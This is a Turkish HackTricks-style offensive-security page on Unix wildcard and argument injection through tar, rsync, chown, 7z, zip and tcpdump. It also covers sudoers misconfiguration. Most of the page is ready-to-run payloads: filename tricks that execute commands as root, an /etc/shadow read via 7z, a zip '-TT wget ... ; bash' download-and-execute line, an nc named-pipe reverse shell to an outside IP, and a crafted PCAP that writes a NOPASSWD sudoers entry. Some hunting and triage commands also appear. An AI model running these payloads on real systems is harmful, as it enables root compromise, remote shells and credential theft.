# Wildcards Spare Tricks

{{#include ../../banners/hacktricks-training.md}}

> Privileged bir script, `tar`, `chown`, `rsync`, `zip`, `7z`, … gibi bir Unix binary'sini `*` gibi tırnak içine alınmamış bir wildcard ile çalıştırdığında Wildcard (diğer adıyla *glob*) **argument injection** meydana gelir.
> Shell, binary'yi çalıştırmadan **önce** wildcard'ı genişlettiğinden, çalışma dizininde dosya oluşturabilen bir attacker, `-` ile başlayan dosya adları oluşturarak bunların **veri yerine option** olarak yorumlanmasını sağlayabilir; böylece keyfi flag'leri veya hatta komutları gizlice aktarabilir.
> Bu sayfa, 2023-2025 arasındaki en kullanışlı primitive'leri, güncel araştırmaları ve modern detection yöntemlerini bir araya getirir.

## chown / chmod

`--reference` flag'ini kötüye kullanarak **keyfi bir dosyanın owner/group bilgisini veya permission bit'lerini kopyalayabilirsiniz**:
```bash
# attacker-controlled directory
touch "--reference=/root/secret``file"   # ← filename becomes an argument
```
root daha sonra şuna benzer bir şey çalıştırdığında:
```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```
`--reference=/root/secret``file` enjekte edilir ve bunun sonucunda eşleşen *tüm* dosyalar `/root/secret``file` dosyasının sahiplik/izinlerini devralır.

*PoC & tool*: [`wildpwn`](https://github.com/localh0t/wildpwn) (combined attack).  
Ayrıntılar için klasik DefenseCode paper'a da bakın.<sup>[[6]](#references)</sup>

---

## tar

### GNU tar (Linux, *BSD, busybox-full)

**checkpoint** özelliğini kötüye kullanarak rastgele komutlar çalıştırın:
```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
Root, örneğin `tar -czf /root/backup.tgz *` komutunu çalıştırdığında `shell.sh`, root olarak yürütülür.

### bsdtar / macOS 14+

Yeni macOS sürümlerindeki varsayılan `tar` (`libarchive` tabanlı), *`--checkpoint`* seçeneğini uygulamaz; ancak harici bir compressor belirtmenize olanak tanıyan **--use-compress-program** flag'iyle yine de code-execution elde edebilirsiniz.
```bash
# macOS example
touch "--use-compress-program=/bin/sh"
```
Ayrıcalıklı bir script `tar -cf backup.tar *` çalıştırdığında `/bin/sh` başlatılır.

---

## rsync

`rsync`, `-e` veya `--rsync-path` ile başlayan command-line flag'ler aracılığıyla remote shell'i veya hatta remote binary'yi override etmenize olanak tanır:
```bash
# attacker-controlled directory
touch "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```
Root daha sonra dizini `rsync -az * backup:/srv/` ile arşivlerse, enjekte edilen flag uzak tarafta shell'inizi başlatır.

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync` mode).

---

## 7-Zip / 7z / 7za

Ayrıcalıklı script wildcard'ın başına option parsing'i durdurmak için savunma amacıyla `--` eklese bile 7-Zip formatı, dosya adının başına `@` eklenerek **file list files** kullanılmasını destekler. Bunu bir symlink ile birleştirerek *arbitrary files* exfiltrate edebilirsiniz:
```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```
root şu şekilde bir şey çalıştırırsa:
```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```
7-Zip, `root.txt` dosyasını (→ `/etc/shadow`) bir file list olarak okumaya çalışır ve işlemi durdurur; **içeriği stderr'e yazdırır**.

Bu durum `-- *` ile de değişmez; çünkü 7-Zip CLI, positional input olarak hem normal dosya adlarını hem de `@listfiles` ifadelerini açıkça kabul eder. Bu nedenle `@root.txt` gibi gerçek bir dosya adı yine özel olarak işlenir.

---

## zip

Bir uygulama, kullanıcı tarafından kontrol edilen dosya adlarını `zip` komutuna (ya bir wildcard aracılığıyla ya da `--` kullanmadan adları tek tek belirterek) aktardığında, iki oldukça pratik primitive kullanılabilir.<sup>[[2]](#references)[[3]](#references)</sup>

- RCE via test hook: `-T`, “test archive” özelliğini etkinleştirir; `-TT <cmd>` ise tester'ı rastgele bir programla değiştirir (uzun biçimi: `--unzip-command <cmd>`). `-` ile başlayan dosya adlarını inject edebiliyorsanız short-options parsing'in çalışması için flag'leri farklı dosya adlarına bölün:
```bash
# Attacker-controlled filenames (e.g., in an upload directory)
# 1) A file literally named: -T
# 2) A file named: -TT wget 10.10.14.17 -O s.sh; bash s.sh; echo x
# 3) Any benign file to include (e.g., data.pcap)
# When the privileged code runs: zip out.zip <files...>
# zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x
```
Notlar
- `'-T -TT <cmd>'` gibi tek bir filename kullanmayı DENEMEYİN — short options karakter başına ayrıştırılır ve başarısız olur. Gösterildiği gibi ayrı token'lar kullanın.
- Uygulama filename'lerdeki slash'leri kaldırıyorsa, bare host/IP'den (`/index.html` varsayılan path) fetch işlemi yapın, `-O` ile yerel olarak kaydedin ve ardından execute edin.
- Token'larınızın nasıl tüketildiğini anlamak için parsing işlemini `-sc` (işlenmiş argv'yi gösterir) veya `-h2` (daha fazla yardım) ile debug edebilirsiniz.

Örnek (zip 3.0 üzerindeki local behavior):
```bash
zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
```
- Data exfil/leak: Web katmanı `zip` stdout/stderr çıktısını yansıtıyorsa (naive wrapper'larda yaygındır), `--help` gibi enjekte edilen flag'ler veya hatalı seçeneklerden kaynaklanan failures HTTP response içinde görünür; bu da command-line injection'ı doğrular ve payload ayarlamayı kolaylaştırır.

---

## Wildcard injection'a karşı vulnerable olan additional binaries (2023-2025 quick list)

Aşağıdaki command'ler modern CTF'lerde ve gerçek ortamlarda abuse edilmiştir. Payload her zaman daha sonra wildcard ile işlenecek writable bir directory içinde *filename* olarak oluşturulur:

| Binary | Abuse edilecek flag | Etki |
| --- | --- | --- |
| `bsdtar` | `--newer-mtime=@<epoch>` → arbitrary `@file` | File contents okuma |
| `flock` | `-c <cmd>` | Command çalıştırma |
| `git`   | `-c core.sshCommand=<cmd>` | git üzerinden SSH ile command execution |
| `scp`   | `-S <cmd>` | ssh yerine arbitrary program spawn etme |

Bu primitive'ler *tar/rsync/zip* classics kadar yaygın değildir, ancak hunting sırasında kontrol edilmeye değerdir.

---

## Vulnerable wrapper'ları ve job'ları hunting

Recent case study'ler wildcard/argv injection'ın artık yalnızca **cron + tar** problemi olmadığını göstermiştir.<sup>[[5]](#references)</sup> Aynı bug class şu alanlarda görülmeye devam ediyor:

- attacker-controlled upload directory'lerinden "her şeyi zip/tar olarak download" eden web feature'ları
- attacker-controlled filename/filter field'larını açığa çıkaran **tcpdump** wrapper'larına sahip vendor/appliance debug shell'leri
- writable directory'ler üzerinde `tar`, `rsync`, `7z`, `zip`, `chown` veya `chmod` çalıştıran backup veya rotation job'ları

Useful triage command'leri:
```bash
# Hunt for interesting binaries fed with globs or positional user data
rg -n --hidden --follow \
'(tar|bsdtar|rsync|zip|7z|7za|chown|chmod|tcpdump).*(\*|\$@|\$\*)' \
/etc /opt /usr/local /srv 2>/dev/null

# Watch real argv during cron/systemd execution
pspy64 -pf -i 1000 | rg 'tar|rsync|zip|7z|tcpdump|chown|chmod'

# Sudoers rules that constrain one argument but still allow extra flags
sudo -l
rg -n 'tcpdump|zip|tar|rsync' /etc/sudoers /etc/sudoers.d 2>/dev/null
```
Hızlı sezgisel kurallar:

- `-- *`, birçok GNU aracı için iyi bir düzeltmedir; ancak `@listfiles` ayrı olarak ayrıştırıldığı için `7z`/`7za` için **değildir**.
- `zip` için, kullanıcı kontrollü dosya adlarını doğrudan listeleyen wrapper'ları arayın; kısa seçeneklerin bölünmesi (`-T` + `-TT <cmd>`), shell glob olmasa bile çalışmaya devam eder.
- `tcpdump` için, **çıktı dosyası adlarını**, **rotasyon ayarlarını** veya **capture-file replay** argümanlarını kontrol etmenize izin veren wrapper'lara özellikle dikkat edin.

---

## tcpdump rotation hooks (-G/-W/-z): wrapper'larda argv injection yoluyla RCE

Kısıtlı bir shell veya vendor wrapper, kullanıcı kontrollü alanları (ör. bir "file name" parametresi) strict quoting/validation uygulamadan bir `tcpdump` command line'ına birleştirdiğinde, fazladan `tcpdump` flag'leri gizlice geçirilebilir. `-G` (time-based rotation), `-W` (dosya sayısı sınırı) ve `-z <cmd>` (post-rotate command) kombinasyonu, `tcpdump`'ı çalıştıran kullanıcı olarak arbitrary command execution sağlar (appliance'larda çoğunlukla root).<sup>[[1]](#references)[[4]](#references)</sup>

Ön koşullar:

- `tcpdump`'a aktarılan `argv` değerlerini etkileyebilirsiniz (ör. `/debug/tcpdump --filter=... --file-name=<HERE>` gibi bir wrapper aracılığıyla).
- Wrapper, file name alanındaki boşlukları veya `-` ile başlayan token'ları sanitize etmez.

Klasik PoC (writable bir path'ten reverse shell script'i çalıştırır):
```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
--file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```
Details:

- `-G 1 -W 1`, eşleşen ilk paketten sonra hemen rotate işlemini zorlar.
- `-z <cmd>`, her rotation işleminde post-rotate komutunu bir kez çalıştırır. Birçok build `<cmd> <savefile>` biçiminde çalışır. `<cmd>` bir script/interpreter ise, argüman işleme biçiminin payload'ınızla eşleştiğinden emin olun.

Çıkarılabilir medya gerektirmeyen varyantlar:

- Dosya yazmak için başka bir primitive'iniz varsa (ör. output redirection kullanmaya izin veren ayrı bir command wrapper), script'inizi bilinen bir path'e bırakın ve platform semantiğine bağlı olarak `-z /bin/sh /path/script.sh` veya `-z /path/script.sh` tetikleyin.
- Bazı vendor wrapper'ları attacker tarafından kontrol edilebilen konumlara rotate eder. Rotate edilen path'i etkileyebiliyorsanız (symlink/directory traversal), harici medya olmadan tamamen kontrol ettiğiniz içeriği çalıştırması için `-z` yönlendirebilirsiniz.

---

## sudoers: tcpdump with wildcards/additional args → arbitrary write/read and root

Çok yaygın sudoers anti-pattern'i:<sup>[[3]](#references)</sup>
```text
(ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
```
Sorunlar
- `*` glob ve izin verici pattern'ler yalnızca ilk `-w` argument'ını kısıtlar. `tcpdump` birden fazla `-w` seçeneğini kabul eder; sonuncusu geçerli olur.
- Kural diğer seçenekleri sabitlemez; bu nedenle `-Z`, `-r`, `-V` vb. seçeneklere izin verilir.

Primitives
- İkinci bir `-w` ile destination path'i override et (ilki yalnızca sudoers'ı karşılar):
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ \
-w /dev/shm/out.pcap \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Kısıtlanmış ağaçtan çıkmak için ilk `-w` içindeki Path traversal:
```bash
sudo tcpdump -c10 \
-w/var/cache/captures/a/../../../../dev/shm/out \
-F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- `-Z root` ile çıktı sahipliğini zorlayın (her yerde root sahipli dosyalar oluşturur):
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-w /dev/shm/root-owned \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- `-r` aracılığıyla hazırlanmış bir PCAP'i yeniden oynatarak keyfi içerik yazma (ör. bir sudoers satırı bırakmak):

<details>
<summary>Tam ASCII payload'ı içeren bir PCAP oluşturun ve bunu root olarak yazın</summary>
```bash
# On attacker box: craft a UDP packet stream that carries the target line
printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers
sudo tcpdump -w sudoers.pcap -c10 -i lo -A udp port 9001 &
cat sudoers | nc -u 127.0.0.1 9001; kill %1

# On victim (sudoers rule allows tcpdump as above)
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
</details>

- `-V <file>` ile keyfi dosya okuma/gizli bilgi leak'i (bir savefiles listesi olarak yorumlanır). Hata tanıları genellikle satırları yankılar ve içeriği leak eder:
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
-w /tmp/dummy \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
---

## Referanslar

- [1] [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
- [2] [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
- [3] [0xdf - HTB Dump: Zip arg injection to RCE + tcpdump sudo misconfig privesc](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
- [4] [FiberGateway GR241AG - Full Exploit Chain](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)
- [5] [Elastic - Potential Shell via Wildcard Injection Detected](https://www.elastic.co/guide/en/security/current/prebuilt-rule-8-19-20-potential-shell-via-wildcard-injection-detected.html)
- [6] [Back To The Future: Unix Wildcards Gone Wild (DefenseCode)](https://www.exploit-db.com/papers/33930)

{{#include ../../banners/hacktricks-training.md}}
